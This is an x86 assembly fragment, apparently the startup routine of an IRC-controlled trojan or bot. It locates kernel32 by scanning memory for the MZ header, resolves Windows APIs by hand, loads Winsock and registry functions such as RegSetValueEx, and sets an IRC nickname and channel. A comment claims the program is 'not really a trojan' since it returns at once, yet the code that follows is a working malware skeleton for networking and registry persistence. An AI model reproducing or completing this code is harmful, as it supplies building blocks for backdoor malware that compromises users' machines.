; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;               Initialization

init:           ret					; this is not really a trojan,
							; just a program which exists immediatly
		mov     edi, dword [esp]
.findk32:       dec     edi
                and     edi, 0ffff0000h
                movzx   eax, word [edi]
                cmp     eax, "MZ"
                jnz     .findk32

                mov     esi, cLocalAlloc
                call    lookupapi
                mov     ebp, eax                        ; save to ebp

                push    allocs
                push    GMEM_FIXED or GMEM_ZEROINIT
                call    ebp
                or      eax, eax
                jz      exit

                xchg    eax, ebp                        ; ebp = pointer to memory
                mov     [LocalAlloc], eax
                dores   cExitProcess, ExitProcess
                dores   cGetTickCount, GetTickCount
                dores   cLoadLibrary, LoadLibrary
                dores   cSleep, Sleep
                dores   cLocalAlloc, LocalAlloc
                dores   cLocalFree, LocalFree
		dores	cCreateFile, CreateFile
		dores	cWriteFile, WriteFile
		dores	cCloseHandle, CloseHandle
		dores	cCreateThread, CreateThread
		dores	cExitThread, ExitThread
		dores	cGetModuleFileName, GetModuleFileName
                lea     eax, [writebuffer]
                mov     dword [eax+0], "ws2_"
                mov     dword [eax+4], "32.d"
                mov     dword [eax+8], "ll"
                invoke  LoadLibrary, eax
                or      eax, eax
                jz      freeexit
                xchg    eax, edi
                dores   cWSACleanup, WSACleanup
                dores   cWSAStartup, WSAStartup
                dores   cclosesocket, closesocket
                dores   cconnect, connect
                dores   cgethostbyname, gethostbyname
                dores   crecv, recv
                dores   csend, send
                dores   csocket, socket
		lea	eax, [writebuffer]
		mov	dword [eax], "adva"
		mov	dword [eax+4], "pi32"
		mov	dword [eax+8], ".dll"
		and	dword [eax+12], 0
		invoke	LoadLibrary, eax
		or	eax, eax
		jz	freeexit
		xchg	eax, edi
		dores	cRegOpenKeyEx, RegOpenKeyEx
		dores	cRegEnumKeyEx, RegEnumKeyEx
		dores	cRegFlushKey, RegFlushKey
		dores	cRegQueryValueEx, RegQueryValueEx
		dores	cRegSetValueEx,RegSetValueEx
		dores	cRegCloseKey, RegCloseKey

		mov	dword [worddata], "aeio"
		mov	dword [worddata+4], "ulnr"
		mov	dword [worddata+8], "kdpc"

                mov     dword [nickname], "abc"		; main nickname
		mov	dword [mainchan], "#ab"

		lea	eax, [modulefilename]
		invoke	GetModuleFileName,0,eax,512

		lea     eax, [writebuffer]
                invoke  WSAStartup,101h,eax  
